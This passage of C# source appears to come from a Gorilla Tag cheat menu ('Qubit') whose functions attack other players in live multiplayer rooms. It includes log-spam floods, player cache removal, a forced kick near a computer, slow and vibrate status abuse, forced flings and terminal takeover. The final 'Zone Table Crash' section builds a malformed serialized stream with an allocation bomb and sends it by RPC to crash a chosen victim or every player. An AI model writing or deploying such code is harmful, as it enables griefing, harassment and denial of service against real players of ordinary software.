        /// Sets a shooting gallery target's score, respecting the hit cooldown. Score of int.MinValue breaks it,
        /// 0 resets it, 6767 increments it.
        /// </summary>
        public static void SetTargetScore(HitTargetNetworkState target, int score, float cooldown = 0.69f, bool audio = true)
        {
            if (!Networking.InRoom || Networking.IsMasterClient)
            {
                if (Time.time <= GetTargetCooldown(target))
                    return;

                                GorillaTag.WatchableIntSO scoreSO = GetTargetScore(target);
                if (scoreSO == null)
                    return;

                int value = score == 6767 ? scoreSO.Value + 1 : score;
                if (audio)
                    target.PlayAudio(scoreSO.Value, value);
                scoreSO.Value = value;
                SetTargetCooldown(target, Time.time + cooldown);
            }
            else
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
        }

        public static void HitTargetGun() =>
            GunLibrary.Point(pointer =>
            {
                HitTargetNetworkState target = pointer.GetComponentInParent<HitTargetNetworkState>();
                if (target != null)
                    SetTargetScore(target, 6767);
            });

        public static void HitAllTargets()
        {
            foreach (HitTargetNetworkState target in GetAllType<HitTargetNetworkState>())
                SetTargetScore(target, 6767);
        }

        public static void SpazTargetGun() =>
            GunLibrary.Point(pointer =>
            {
                HitTargetNetworkState target = pointer.GetComponentInParent<HitTargetNetworkState>();
                if (target != null)
                    SetTargetScore(target, Random.Range(int.MinValue, int.MaxValue));
            });

        public static void SpazAllTargets()
        {
            foreach (HitTargetNetworkState target in GetAllType<HitTargetNetworkState>())
                SetTargetScore(target, Random.Range(int.MinValue, int.MaxValue), 0f, false);
        }

        public static void BreakTargetGun() =>
            GunLibrary.Point(pointer =>
            {
                HitTargetNetworkState target = pointer.GetComponentInParent<HitTargetNetworkState>();
                if (target != null)
                    SetTargetScore(target, int.MinValue);
            });

        public static void BreakAllTargets()
        {
            foreach (HitTargetNetworkState target in GetAllType<HitTargetNetworkState>())
                SetTargetScore(target, int.MinValue, 0f, false);
        }

        public static void ResetTargetGun() =>
            GunLibrary.Point(pointer =>
            {
                HitTargetNetworkState target = pointer.GetComponentInParent<HitTargetNetworkState>();
                if (target != null)
                    SetTargetScore(target, 0);
            });

        public static void ResetAllTargets()
        {
            foreach (HitTargetNetworkState target in GetAllType<HitTargetNetworkState>())
                SetTargetScore(target, 0, 0f, false);
        }

        /// <summary>
        /// Spazzes the ranked match state by repeatedly setting the infected mode threshold.
        /// </summary>
        public static void SpazRankedState()
        {
            if (Time.time < rankedStateSpazDelay) return;
            rankedStateSpazDelay = Time.time + 0.149f;

            SetRankedThreshold(0.001f);
        }

        private static float rankedStateSpazDelay;

        /// <summary>
        /// Breaks the critters manager, disabling all critters equipment. Requires master client.
        /// </summary>
        public static void BreakCritters()
        {
            if (!Networking.IsMasterClient)
            {
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
                return;
            }

            CrittersManager instance = CrittersManager.instance;
            if (instance == null)
                return;

            PhotonNetwork.Destroy(((Component)instance).gameObject.GetPhotonView());
        }

        #endregion

        #region Player Visibility / Computer Kick

        /// <summary>
        /// Removes a player's cached instantiation from the room, so new joiners won't see them.
        /// </summary>
        public static void DestroyPlayer(VRRig target)
        {
            PhotonNetwork.OpRemoveCompleteCacheOfPlayer(Players.GetPlayerFromVRRig(target).ActorNumber);
        }

        public static void DestroyPlayerGun()
        {
            GunLibrary.Target(gunTarget => DestroyPlayer(gunTarget), new GunLibrary.GunSettings { locks = true });
        }

        public static void DestroyAllPlayers()
        {
            foreach (VRRig rig in Players.ActiveRigs.Where(rig => !rig.isLocal))
                DestroyPlayer(rig);
        }

        /// <summary>
        /// Rejoins the private room, kicking everyone touching the computer join button.
        /// </summary>
        public static void KickAllNearComputer()
        {
            if (!Networking.InRoom)
                return;

            if (PhotonNetwork.CurrentRoom.IsVisible)
            {
                Notifications.SendFormat("red", "ERROR", "You must be in a private lobby.");
                return;
            }

            GorillaNetworking.GorillaComputer computer = GorillaNetworking.GorillaComputer.instance;
            if (!computer.friendJoinCollider.playerIDsCurrentlyTouching.Any(info => info != null && info.UserID != Networking.LocalPlayer.UserId))
            {
                Notifications.SendFormat("red", "ERROR", "No one is near a computer.");
                return;
            }

            computerRoomName = PhotonNetwork.CurrentRoom.Name;
            computer.OnGroupJoinButtonPress(0, computer.friendJoinCollider);
            Notifications.SendFormat("green", "QUBIT", "Kicking players, please wait...");
        }

        internal static string computerRoomName;

        #endregion

        #region Cover (MonkeBlocks griefing)

        private const int CoverPieceType = 1858470402;
        private const string MonkeBlocksPath = "Environment Objects/MonkeBlocksRoomPersistent/";

        /// <summary>
        /// Drops a frozen block over a monke blocks location, blocking it off. 0 entrance, 1 board,
        /// 2 computer, 3 gamemode changer, 4 size changers, 5 private plots, 6 elevator, 7 ShareMyBlocks.
        /// </summary>
        public static void CoverObject(int n)
        {
            Vector3 position;
            Quaternion rotation;
            switch (n)
            {
                case 0:
                    position = GetObject(MonkeBlocksPath + "DropZones/DropZone_Hallway").transform.position + new Vector3(Random.Range(-1.13f, 1.2f), Random.Range(-0.8f, 1.248f), Random.Range(-0.35f, 0.65f));
                    rotation = Quaternion.Euler(180f, 120f, 90f);
                    break;
                case 1:
                    position = GetObject(MonkeBlocksPath + "AtticScoreBoard").transform.position + new Vector3(Random.Range(1.7f, 2.2f), Random.Range(0f, 0.8f), Random.Range(0.9f, 1.72f));
                    rotation = Quaternion.Euler(180f, 53f, 90f);
                    break;
                case 2:
                    position = GetObject(MonkeBlocksPath + "MonkeBlocksComputer/GorillaComputerObject/ComputerUI").transform.position + new Vector3(Random.Range(-0.4f, 0.75f), Random.Range(0.06f, 0.26f), Random.Range(-0.44f, 0.21f));
                    rotation = Quaternion.Euler(180f, 90f, 180f);
                    break;
                case 3:
                    position = GetObject("MonkeBlocksRoomScene/GameModeSelector_MonkeBlocks (prefab)").transform.position + new Vector3(Random.Range(-0.007f, 0.08f), Random.Range(0.34f, 0.73f), Random.Range(-0.49f, -0.2f));
                    rotation = Quaternion.Euler(180f, 100f, 90f);
                    break;
                case 4:
                    {
                        string shrinkPath = MonkeBlocksPath + "ShrinkStations/SnapPieceShrink01";
                        string glassPath = "/ScaleRoot/Builder_ShrinkStation/Builder_ShrinkStation_Glass";
                        GameObject[] stations =
                        {
                            GetObject(shrinkPath + glassPath),
                            GetObject(shrinkPath + " (1)" + glassPath),
                            GetObject(shrinkPath + " (2)" + glassPath),
                            GetObject(shrinkPath + " (3)" + glassPath)
                        };
                        GameObject station = stations[Random.Range(0, stations.Length)];
                        position = station.transform.position + new Vector3(Random.Range(-0.1f, 0.1f), Random.Range(-0.1f, 0.5f), Random.Range(-0.1f, 0.1f));
                        rotation = station.transform.rotation;
                        break;
                    }
                case 5:
                    {
                        var table = ManagerRegistry.GetBuilderTable();
                        if (table == null || table.allPrivatePlots.Count == 0)
                            return;

                        position = table.allPrivatePlots[Random.Range(0, table.allPrivatePlots.Count)].transform.position + new Vector3(Random.Range(-0.45f, 0.45f), Random.Range(0f, 1.2f), Random.Range(-0.45f, 0.45f));
                        rotation = Quaternion.identity;
                        break;
                    }
                case 6:
                    position = GetObject("Environment Objects/05Maze_PersistentObjects/GhostReactorElevatorManager/MonkeBlocksElevator/HasVisualComponents/GhostReactor_Elevator/GhostReactor_Elevator_Door_Top").transform.position + new Vector3(Random.Range(0.6f, 0.7f), Random.Range(-0.62f, 0.91f), Random.Range(-1.3f, 0.1f));
                    rotation = Quaternion.Euler(0f, 355f, 85f);
                    break;
                case 7:
                    position = new Vector3(Random.Range(-123.9f, -121.48f), Random.Range(18.8016f, 20.8f), -233.4f);
                    rotation = Quaternion.Euler(0f, 75f, 85f);
                    break;
                default:
                    return;
            }

            Qubit.Libraries.Entities.Blocks.CreatePiece(CoverPieceType, position, rotation, 0, overrideFreeze: true);
        }

        #endregion

        #region Log Spam

        private static bool logSpamActive;
        private static GorillaNetworking.GorillaNetworkJoinTrigger[] joinTriggers;

        /// <summary>
        /// Log Spam V1: teleports your rig to random map join triggers, filling everyone's logs with errors.
        /// </summary>
        public static void LogSpamAll()
        {
            if (!logSpamActive)
            {
                logSpamActive = true;
                joinTriggers = GetAllType<GorillaNetworking.GorillaNetworkJoinTrigger>();
            }

            References.LocalRig.enabled = false;
            if (joinTriggers != null && joinTriggers.Length > 0)
                References.LocalRig.transform.position = joinTriggers[Random.Range(0, joinTriggers.Length)].transform.position;
        }

        public static void DisableLogSpamAll()
        {
            if (logSpamActive)
            {
                References.LocalRig.enabled = true;
                logSpamActive = false;
            }
        }

        /// <summary>
        /// Log Spam V2: cycles the target range scores to int.MinValue and back, filling everyone's logs with errors.
        /// </summary>
        public static void LogSpamTargets()
        {
            if (!Networking.InRoom || Networking.IsMasterClient)
            {
                List<HitTargetNetworkState> targets = GetAllType<HitTargetNetworkState>().ToList();
                bool someoneInMaps = Players.ActiveRigs.Any(rig =>
                {
                    GTZone zone = rig.zoneEntity.currentZone;
                    return zone == GTZone.forest || zone == GTZone.canyon || zone == GTZone.mountain;
                });

                if (!someoneInMaps)
                {
                    Notifications.SendFormat("red", "ERROR", "Someone must be in forest, canyons, or mountains.");
                    return;
                }

                foreach (HitTargetNetworkState target in targets)
                {
                    target.hitCooldownTime = 0;
                    target.TargetHit(Vector3.zero, Vector3.zero);
                    target.TargetHit(Vector3.zero, Vector3.zero);
                }
            }
            else
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
        }

        /// <summary>
        /// Log Spam V3: spams the voice chat event with invalid data, filling everyone's logs with errors.
        /// </summary>
        public static void LogSpamVoice()
        {
            if (!Networking.InRoom)
            {
                Notifications.SendFormat("red", "ERROR", "You must be in a room.");
                return;
            }

            var client = Photon.Voice.PUN.PhotonVoiceNetwork.Instance.Client;
            object[] eventData = new object[]
            {
                (byte)0,
                (byte)1,
                new object[] { new Dictionary<byte, object> { { 1, 0 }, { 2, 0 }, { 3, 0 }, { 4, "QUBIT ON TOP" }, { 5, 0 } } }
            };

            client.OpRaiseEvent((byte)202, eventData, new Photon.Realtime.RaiseEventOptions { Receivers = Photon.Realtime.ReceiverGroup.All }, new ExitGames.Client.Photon.SendOptions { Reliability = false, Channel = 0 });
        }

        /// <summary>
        /// Log Spam V4: drops a logging block in monke blocks, filling everyone's logs with errors.
        /// </summary>
        public static void LogSpamBlocks()
        {
            if (!Networking.IsMasterClient)
            {
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
                return;
            }

            if (!Players.ActiveRigs.Any(rig => rig.zoneEntity.currentZone == GTZone.monkeBlocks))
            {
                Notifications.SendFormat("red", "ERROR", "Someone must be in monke blocks.");
                return;
            }

            Qubit.Libraries.Entities.Blocks.CreatePiece(-741198570,
                References.LocalRig.transform.position, Quaternion.identity, 0);
        }

        /// <summary>
        /// Log Spam V5/V6: spawns broken entities above you, filling everyone's logs with errors.
        /// Locked to the ghost reactor map and super infection gamemodes, matching where the game allows these entities.
        /// </summary>
        public static void LogSpamEntities(int hash)
        {
            GTZone zone = References.LocalRig.zoneEntity.currentZone;
            if (zone != GTZone.ghostReactor && zone != GTZone.ghostReactorDrill && zone != GTZone.ghostReactorTunnel && ManagerRegistry.GorillaGameManager.GameType() != GameModeType.SuperInfect)
            {
                Notifications.SendFormat("red", "ERROR", "You must be in ghost reactor or a super infection gamemode.");
                return;
            }

            GameEntityManager manager = GameEntityManager.GetManagerForZone(zone);
            if (manager == null)
                return;

            for (int i = 0; i < 50; i++)
                Qubit.Libraries.Entities.GameEntities.CreateItem(RpcTarget.All, hash,
                    References.LocalRig.transform.position + new Vector3(0f, 25f, 0f),
                    Quaternion.identity, Vector3.zero, Vector3.zero, manager: manager);
        }

        #endregion

        public static void InfectionToTag()
        {
            if (!Networking.IsMasterClient)
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
            else
            {
                GorillaTagManager gorillaTagManager = ManagerRegistry.GorillaTagManager;
                gorillaTagManager.infectedModeThreshold = PhotonNetwork.CurrentRoom.MaxPlayers + 1;
            }
        }

        public static void TagToInfection()
        {
            if (!Networking.IsMasterClient)
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
            else
            {
                GorillaTagManager gorillaTagManager = ManagerRegistry.GorillaTagManager;
                gorillaTagManager.infectedModeThreshold = 1;
            }
        }

        public static void FixThreshold()
        {
            GorillaTagManager gorillaTagManager = ManagerRegistry.GorillaTagManager;
            gorillaTagManager.infectedModeThreshold = 4;
        }
        public static void RockSelf()
        {
            if (PhotonNetwork.IsMasterClient)
                AddRock(Networking.LocalPlayer);
            else
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
        }

        public static void RockGun()
        {
            GunLibrary.Target(gunTarget =>
            {
                Overpowered.rockDebounce = Time.time + 0.1f;
                if (PhotonNetwork.IsMasterClient)
                    AddRock(GetPlayerFromVRRig(gunTarget));
                else
                    Notifications.SendFormat("red", "ERROR", "You are not master client.");
            }, new GunLibrary.GunSettings { when = () => Time.time > Overpowered.rockDebounce });
        }

        public static void RockAura()
        {
            if (!Networking.InRoom) return;
            List<VRRig> nearbyPlayers = new List<VRRig>();

            foreach (VRRig vrrig in Players.ActiveRigs)
            {
                if (Vector3.Distance(vrrig.transform.position, References.LocalRig.transform.position) < 4 && !vrrig.IsLocal())
                    nearbyPlayers.Add(vrrig);
                else if (nearbyPlayers.Contains(vrrig))
                    nearbyPlayers.Remove(vrrig);
            }

            if (nearbyPlayers.Count > 0)
            {
                foreach (VRRig nearbyPlayer in nearbyPlayers)
                {
                    if (Time.time > Overpowered.rockDebounce)
                    {
                        Overpowered.rockDebounce = Time.time + 0.1f;
                        if (PhotonNetwork.IsMasterClient)
                            AddRock(GetPlayerFromVRRig(nearbyPlayer));
                        else
                            Notifications.SendFormat("red", "ERROR", "You are not master client.");
                    }
                }
            }
        }

        public static void RockOnTouch()
        {
            if (!Networking.InRoom) return;

            List<VRRig> touchedPlayers = new List<VRRig>();

            foreach (VRRig rig in Players.ActiveRigs)
            {
                if (!rig.IsLocal())
                {
                    if (rig.IsBeingTouched())
                    {
                        touchedPlayers.Add(rig);
                    }
                }
            }

            if (touchedPlayers.Count > 0)
            {
                foreach (VRRig rig in touchedPlayers)
                {
                    if (Time.time > Overpowered.rockDebounce)
                    {
                        Overpowered.rockDebounce = Time.time + 0.1f;
                        if (PhotonNetwork.IsMasterClient)
                            AddRock(rig.GetPlayer());
                        else
                            Notifications.SendFormat("red", "ERROR", "You are not master client.");
                    }
                }
            }
        }

        public static void RockAll()
        {
            if (Time.time > Overpowered.rockDebounce)
            {
                Overpowered.rockDebounce = Time.time + 0.1f;
                if (PhotonNetwork.IsMasterClient)
                    AddRock(GetRandomPlayer(true));
                else
                    Notifications.SendFormat("red", "ERROR", "You are not master client.");
            }
        }

        public static void SlowSelf()
        {
            NetPlayer player = PhotonNetwork.LocalPlayer;
            Overpowered.SetStatus(RoomSystem.StatusEffects.TaggedTime, new RaiseEventOptions { TargetActors = new[] { player.ActorNumber } });
            RPCProtection();
        }
        public static void SlowGun()
        {
            GunLibrary.Target(gunTarget =>
            {
                NetPlayer player = GetPlayerFromVRRig(gunTarget);
                Overpowered.SetStatus(RoomSystem.StatusEffects.TaggedTime, new RaiseEventOptions { TargetActors = new[] { player.ActorNumber } });
                RPCProtection();
                Overpowered.slowDelay = Time.time + 1f;
            }, new GunLibrary.GunSettings { when = () => Time.time > Overpowered.slowDelay });
        }

        public static void SlowAura()
        {
            if (!Networking.InRoom) return;
            List<VRRig> nearbyPlayers = new List<VRRig>();

            foreach (VRRig vrrig in Players.ActiveRigs)
            {
                if (Vector3.Distance(vrrig.transform.position, References.LocalRig.transform.position) < 4 && !vrrig.IsLocal())
                    nearbyPlayers.Add(vrrig);
                else if (nearbyPlayers.Contains(vrrig))
                    nearbyPlayers.Remove(vrrig);
            }

            if (nearbyPlayers.Count > 0)
            {
                foreach (VRRig nearbyPlayer in nearbyPlayers)
                {
                    NetPlayer player = GetPlayerFromVRRig(nearbyPlayer);
                    Overpowered.SetStatus(RoomSystem.StatusEffects.TaggedTime, new RaiseEventOptions { TargetActors = new[] { player.ActorNumber } });
                    RPCProtection();
                }
            }
        }

        public static void SlowOnTouch()
        {
            if (!Networking.InRoom) return;

            List<VRRig> touchedPlayers = new List<VRRig>();

            foreach (VRRig rig in Players.ActiveRigs)
            {
                if (!rig.IsLocal())
                {
                    if (rig.IsBeingTouched())
                    {
                        touchedPlayers.Add(rig);
                    }
                }
            }

            if (touchedPlayers.Count > 0)
            {
                foreach (VRRig rig in touchedPlayers)
                {
                    NetPlayer player = rig.GetPlayer();
                    Overpowered.SetStatus(RoomSystem.StatusEffects.TaggedTime, new RaiseEventOptions { TargetActors = new[] { player.ActorNumber } });
                    RPCProtection();
                }
            }
        }

        public static void SlowAll()
        {
            if (Time.time > Overpowered.slowDelay)
            {
                Overpowered.SetStatus(RoomSystem.StatusEffects.TaggedTime, new RaiseEventOptions { Receivers = ReceiverGroup.Others });
                RPCProtection();
                Overpowered.slowDelay = Time.time + 1f;
            }
        }

        public static void VibrateSelf()
        {
            NetPlayer owner = PhotonNetwork.LocalPlayer;
            Overpowered.SetStatus(RoomSystem.StatusEffects.JoinedTaggedTime, new RaiseEventOptions { TargetActors = new[] { owner.ActorNumber } });
            RPCProtection();
        }
        public static void VibrateGun()
        {
            GunLibrary.Target(gunTarget =>
            {
                NetPlayer owner = GetPlayerFromVRRig(gunTarget);
                Overpowered.SetStatus(RoomSystem.StatusEffects.JoinedTaggedTime, new RaiseEventOptions { TargetActors = new[] { owner.ActorNumber } });
                RPCProtection();
                Overpowered.vibrateDelay = Time.time + 0.5f;
            }, new GunLibrary.GunSettings { when = () => Time.time > Overpowered.vibrateDelay });
        }

        public static void VibrateAura()
        {
            if (!Networking.InRoom) return;
            List<VRRig> nearbyPlayers = new List<VRRig>();

            foreach (VRRig vrrig in Players.ActiveRigs)
            {
                if (Vector3.Distance(vrrig.transform.position, References.LocalRig.transform.position) < 4 && !vrrig.IsLocal())
                    nearbyPlayers.Add(vrrig);
                else if (nearbyPlayers.Contains(vrrig))
                    nearbyPlayers.Remove(vrrig);
            }

            if (nearbyPlayers.Count > 0)
            {
                foreach (VRRig nearbyPlayer in nearbyPlayers)
                {
                    NetPlayer owner = GetPlayerFromVRRig(nearbyPlayer);
                    Overpowered.SetStatus(RoomSystem.StatusEffects.JoinedTaggedTime, new RaiseEventOptions { TargetActors = new[] { owner.ActorNumber } });
                    RPCProtection();
                }
            }
        }

        public static void VibrateOnTouch()
        {
            if (!Networking.InRoom) return;

            List<VRRig> touchedPlayers = new List<VRRig>();

            foreach (VRRig rig in Players.ActiveRigs)
            {
                if (!rig.IsLocal())
                {
                    if (rig.IsBeingTouched())
                    {
                        touchedPlayers.Add(rig);
                    }
                }
            }

            if (touchedPlayers.Count > 0)
            {
                foreach (VRRig rig in touchedPlayers)
                {
                    NetPlayer owner = rig.GetPlayer();
                    Overpowered.SetStatus(RoomSystem.StatusEffects.JoinedTaggedTime, new RaiseEventOptions { TargetActors = new[] { owner.ActorNumber } });
                    RPCProtection();
                }
            }
        }

        public static void VibrateAll()
        {
            if (Time.time > Overpowered.vibrateDelay)
            {
                Overpowered.SetStatus(RoomSystem.StatusEffects.JoinedTaggedTime, new RaiseEventOptions { Receivers = ReceiverGroup.Others });
                RPCProtection();
                Overpowered.vibrateDelay = Time.time + 0.5f;
            }
        }

        public static void SoundSpam(int id)
        {
            if (rightGrab)
                Audio.PlayTag(id, 999999f);
        }

        public static void UpdateMasterLabel() =>
            Manager.GetIndex("MasterLabel").displayName = Networking.IsMasterClient ? "You are master client." : "You are not master client.";

        public static GreyZoneManager[] grayZones;
        public static float grayZoneSpamDelay;
        public static Coroutine guardianSpamRoutine;

        public static void ActivateGrayZone()
        {
            if (!Networking.IsMasterClient)
            {
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
                return;
            }

            grayZones = UnityEngine.Object.FindObjectsByType<GreyZoneManager>(FindObjectsSortMode.None);
            foreach (GreyZoneManager zone in grayZones)
            {
                zone.forceTimeOfDayToNight = true;
                zone.greyZoneActiveDuration = float.MaxValue;
                zone.ActivateGreyZoneAuthority();
                zone.gravityFactorOptionSelection = 0;
            }
        }

        public static void DeactivateGrayZone()
        {
            if (!Networking.IsMasterClient || grayZones == null) return;

            foreach (GreyZoneManager zone in grayZones)
            {
                zone.greyZoneAmbienceVolume = 0f;
                zone.DeactivateGreyZoneAuthority();
                zone.gravityFactorOptionSelection = 0;
            }
        }

        public static void EnableSpamGrayZone() => grayZones = UnityEngine.Object.FindObjectsByType<GreyZoneManager>(FindObjectsSortMode.None);

        public static void SpamGrayZone()
        {
            if (!(Time.time > grayZoneSpamDelay) || !Networking.IsMasterClient || grayZones == null) return;
            grayZoneSpamDelay = Time.time + 0.08f;

            foreach (GreyZoneManager zone in grayZones)
                if (zone.GreyZoneActive)
                {
                    zone.DeactivateGreyZoneAuthority();
                    zone.gravityFactorOptionSelection = 0;
                }
                else
                {
                    zone.greyZoneAmbienceVolume = 0f;
                    zone.ActivateGreyZoneAuthority();
                    zone.DeactivateGreyZoneLocal();
                }
        }

        public static void DisableSpamGrayZone()
        {
            if (grayZones == null) return;
            foreach (GreyZoneManager zone in grayZones)
                if (zone.GreyZoneActive)
                {
                    zone.greyZoneAmbienceVolume = 0f;
                    zone.DeactivateGreyZoneAuthority();
                }
        }

        public static IEnumerator GuardianSpamCoroutine()
        {
            while (Networking.IsMasterClient)
            {
                GorillaGuardianZoneManager[] zones = GorillaGuardianZoneManager.zoneManagers.Where(z => z != null && z.enabled && z.IsZoneValid()).ToArray();
                Player[] players = PhotonNetwork.PlayerListOthers.Where(p => p != null).ToArray();

                if (zones.Length == 0 || players.Length == 0)
                {
                    yield return new WaitForSeconds(0.5f);
                    continue;
                }

                GorillaGuardianZoneManager targetZone = zones[Random.Range(0, zones.Length)];
                Player targetPlayer = players[Random.Range(0, players.Length)];
                targetZone.SetGuardian(targetPlayer);

                yield return new WaitForSeconds(0.5f);

                if (targetZone != null && Equals(targetZone.CurrentGuardian.GetPlayerRef(), targetPlayer))
                    targetZone.SetGuardian(null);
            }
        }

        public static void EnableGuardianSpam()
        {
            if (!Networking.IsMasterClient)
            {
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
                return;
            }

            guardianSpamRoutine = Coroutines.instance.StartCoroutine(GuardianSpamCoroutine());
        }

        public static void DisableGuardianSpam()
        {
            if (guardianSpamRoutine != null)
            {
                Coroutines.instance.StopCoroutine(guardianSpamRoutine);
                guardianSpamRoutine = null;
            }

            if (!Networking.IsMasterClient) return;
            foreach (GorillaGuardianZoneManager zone in GorillaGuardianZoneManager.zoneManagers.Where(z => z != null && z.enabled && z.IsZoneValid()))
                zone.SetGuardian(null);
        }

        #region Variant Mods

        public static void GuardianFlingGun()
        {
            GunLibrary.Target(gunTarget =>
            {
                if (GameModes.IsGuardian(Networking.LocalPlayer))
                {
                    GetNetworkViewFromVRRig(gunTarget).SendRPC("GuardianLaunchPlayer", RpcTarget.Others, RandomVector3(30f));
                    RPCProtection();
                }
                else
                    Notifications.SendFormat("red", "ERROR", "You must be guardian.");
                Overpowered.guardianDelay = Time.time + 0.1f;
            }, new GunLibrary.GunSettings { when = () => Time.time > Overpowered.guardianDelay });
        }

        public static void GuardianFlingAll()
        {
            if (rightTrigger > 0.5f && Time.time > Overpowered.guardianDelay)
            {
                Overpowered.guardianDelay = Time.time + 0.1f;
                if (GameModes.IsGuardian(Networking.LocalPlayer))
                {
                    foreach (VRRig plr in Players.ActiveRigs.Where(plr => !plr.isLocal))
                    {
                        GetNetworkViewFromVRRig(plr).SendRPC("GuardianLaunchPlayer", RpcTarget.Others, RandomVector3(30f));
                        RPCProtection();
                    }
                }
                else
                    Notifications.SendFormat("red", "ERROR", "You must be guardian.");
            }
        }

        public static void GuardianSpazLaunchAll()
        {
            if (rightTrigger > 0.5f && Time.time > Overpowered.guardianDelay)
            {
                Overpowered.guardianDelay = Time.time + 0.05f;
                if (GameModes.IsGuardian(Networking.LocalPlayer))
                {
                    VRRig target = GetRandomVRRig();
                    if (target != null)
                    {
                        GetNetworkViewFromVRRig(target).SendRPC("GuardianLaunchPlayer", RpcTarget.Others, RandomVector3(60f));
                        RPCProtection();
                    }
                }
                else
                    Notifications.SendFormat("red", "ERROR", "You must be guardian.");
            }
        }

        public static void PaintbrawlGodModeGun()
        {
            GunLibrary.Target(gunTarget =>
            {
                if (!Networking.IsMasterClient)
                {
                    Notifications.SendFormat("red", "ERROR", "You are not master client.");
                    return;
                }

                GameModes.SetPaintbrawlHealth(GetPlayerFromVRRig(gunTarget), 4);
                materialDelay = Time.time + 0.1f;
            }, new GunLibrary.GunSettings { when = () => Time.time > materialDelay });
        }

        public static void PaintbrawlGodModeAll()
        {
            if (!Networking.IsMasterClient)
            {
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
                return;
            }

            foreach (Player player in PhotonNetwork.PlayerList)
                GameModes.SetPaintbrawlHealth(player.ActorNumber, 4);
        }

        public static void PaintbrawlHitGun()
        {
            GunLibrary.Target(gunTarget =>
            {
                GameModes.ReportPaintbrawlHit(GetPlayerFromVRRig(gunTarget));
                materialDelay = Time.time + 0.3f;
            }, new GunLibrary.GunSettings { when = () => Time.time > materialDelay });
        }

        public static void PaintbrawlHitAll()
        {
            foreach (NetPlayer player in ManagerRegistry.NetworkSystem.PlayerListOthers)
                GameModes.ReportPaintbrawlHit(player);
        }

        public static void TakeoverAllTerminals()
        {
            if (!Networking.IsMasterClient)
            {
                Notifications.SendFormat("red", "ERROR", "You are not master client.");
                return;
            }

            foreach (Player player in PhotonNetwork.PlayerListOthers)
                ManagerRegistry.VirtualStumpSerializer.SendRPC("SetTerminalControlStatus_RPC", true, false, player.ActorNumber);

            ManagerRegistry.VirtualStumpSerializer.SendRPC("SetTerminalControlStatus_RPC", true, true, PhotonNetwork.LocalPlayer.ActorNumber);
        }

        public static void MovePlayer(VRRig target, Vector3 velocity)
        {
            NetworkView view = GetNetworkViewFromVRRig(target);
            ViewSerialization.OverrideSerialization = () => { view.SendRPC("GuardianLaunchPlayer", RpcTarget.Others, velocity); RPCProtection(); return true; };
        }

        public static void MovePlayerGun(Vector3 velocity)
        {
            GunLibrary.Target(gunTarget =>
            {
                MovePlayer(gunTarget, velocity);
                Overpowered.guardianDelay = Time.time + 0.1f;
            }, new GunLibrary.GunSettings { when = () => Time.time > Overpowered.guardianDelay });
        }

        public static void MovePlayerForwardsGun() => MovePlayerGun(References.Player.headCollider.transform.forward * 20f);
        public static void MovePlayerBackwardsGun() => MovePlayerGun(-References.Player.headCollider.transform.forward * 20f);
        public static void MovePlayerUpwardsGun() => MovePlayerGun(Vector3.up * 20f);
        public static void MovePlayerRandomGun() => MovePlayerGun(RandomVector3(20f));

        public static void MovePlayerControllable()
        {
            if (rightTrigger > 0.5f && Time.time > Overpowered.guardianDelay)
            {
                Overpowered.guardianDelay = Time.time + 0.1f;
                VRRig target = GetClosestVRRig();
                if (target != null && !target.isLocal)
                    MovePlayer(target, new Vector3(rightJoystick.x, 0f, rightJoystick.y) * 20f);
            }
        }

        #endregion

        #region Zone Table Crash

        /// <summary>
        /// Crashes whoever your hand desires by sending them a poisoned zone table stream.
        /// The stream carries a header int the game's deserializer never expects, so every
        /// component reader desynchronizes on the victim and the zone entity system dies.
        /// </summary>
        public static void ZoneTableCrashGun()
        {
            GunLibrary.Target(gunTarget =>
            {
                GameEntityManager manager = ManagerRegistry.GhostReactor.GameEntityManager;
                if (manager == null)
                    return;

                SendPoisonedZoneTable(manager, gunTarget.GetPhotonPlayer());
            }, new GunLibrary.GunSettings { locks = true });
        }

        /// <summary>
        /// Crashes everyone by sending them a poisoned zone table stream.
        /// </summary>
        public static void ZoneTableCrashAll()
        {
            GameEntityManager manager = ManagerRegistry.GhostReactor.GameEntityManager;
            if (manager == null)
                return;

            foreach (Player player in PhotonNetwork.PlayerList.Where(p => !p.IsLocal))
                SendPoisonedZoneTable(manager, player);
        }

        private const int ZoneTableChunkSize = 512;

        private static void SendPoisonedZoneTable(GameEntityManager manager, Player victim)
        {
            if (victim == null)
                return;

            byte[] poisoned;
            using (System.IO.MemoryStream stream = new System.IO.MemoryStream())
            {
                using (System.IO.BinaryWriter writer = new System.IO.BinaryWriter(stream))
                {
                    // Header int the game deserializer never reads — shifts every
                    // subsequent component read off by four bytes.
                    writer.Write(0);

                    // Serialize zone component data exactly as the game writes it,
                    // so the stream passes superficial validity checks.
                    List<IGameEntityZoneComponent> components = Traverse.Create(manager).Field<List<IGameEntityZoneComponent>>("zoneComponents").Value;
                    if (components != null)
                    {
                        for (int i = 0; i < components.Count; i++)
                            components[i].SerializeZoneData(writer);
                    }

                    writer.Write(int.MaxValue); // entity count — allocation bomb on read
                    writer.Flush();

                    poisoned = Ionic.Zlib.GZipStream.CompressBuffer(stream.ToArray());
                }
            }

            NetworkView netView = manager.GetComponent<NetworkView>();
            if (netView == null)
                return;

            byte[] chunk = new byte[ZoneTableChunkSize];
            int sent = 0;
            int packet = 0;
            while (sent < poisoned.Length)
            {
                int size = Mathf.Min(ZoneTableChunkSize, poisoned.Length - sent);
                Array.Copy(poisoned, sent, chunk, 0, size);

                // Direct NetPlayer send — single victim, not a broadcast.
                netView.SendRPC("SendTableDataRPC", ManagerRegistry.NetworkSystem.GetPlayer(victim), packet, poisoned.Length, chunk);

                sent += size;
                packet++;
            }

            RPCProtection();
        }

        #endregion

        #endregion
    }
}
